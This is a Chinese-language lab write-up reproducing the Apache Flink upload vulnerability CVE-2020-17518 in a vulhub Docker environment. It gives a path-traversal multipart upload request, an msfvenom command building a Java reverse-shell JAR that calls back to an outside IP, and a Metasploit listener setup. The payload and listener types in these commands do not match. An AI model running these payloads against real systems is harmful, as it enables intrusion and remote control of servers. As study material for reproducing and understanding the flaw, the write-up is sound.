ailx10说：这篇是我2023年9月写的。这一篇继续看 Flink，不过换成了文件上传。先把 multipart 里的文件名当成路径来观察，确认能不能写到预期之外的位置，之后又走了一遍正常上传 JAR、提交作业的流程。两段操作放在一起很容易让人以为是一回事，我现在更愿意把它们拆开看：一个是路径限制失守，一个是平台本来就有的作业执行能力。笔记留下了当时的尝试，也提醒我，监听类型、载荷和运行状态得对得上，不能只看连接出现就跳过过程。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明Apache Flink 文件上传漏洞(CVE-2020-17518)环境搭建成功了

![](/notes-assets/7af504714f04cee677dd.webp)

掏出Burpsuite，就是一个HTTP请求重放

```
POST /jars/upload HTTP/1.1

Host: 144.34.162.13/:8081

Accept-Encoding: gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36

Connection: close

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y

Content-Length: 185



------WebKitFormBoundaryoZ8meKnrrso89R6Y

Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"



success

------WebKitFormBoundaryoZ8meKnrrso89R6Y--
```

![](/notes-assets/5312c27487cfbdf791ac.webp)

上服务器docker上查看一下文件是否创建成功，哎，果然创建成功了

```
docker exec -it 5378528c96fc /bin/bash
```

![](/notes-assets/f0478164e5dd5907dfcc.webp)

那么写入一个webshell，是不是就很简单了，但是难点还是web服务的路径怎么弄，好在有办法直接上传一个Jar包，然后点击就能触发执行

![](/notes-assets/d01c887d51e6de08ce9f.webp)

第一步：搞到一个反弹shell的Jar包

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=174.137.58.6 LPORT=8888 -f jar > ailx10.jar
```

第二步：启动msf 监听 8888

```
use exploit/multi/handler

set payload java/shell/reverse_tcp

set LHOST 174.137.58.6

set LPORT 8888

run
```

![](/notes-assets/3fb610f6a1faa5c7d71d.webp)

第三步：上传Jar包，点击Submit 触发，成功反弹shell

![](/notes-assets/22fb8ea25aba0c3c32e6.webp)

第四步：删除上传的Jar包，依然能反弹shell

![](/notes-assets/a619edaea0048e0c26d0.webp)
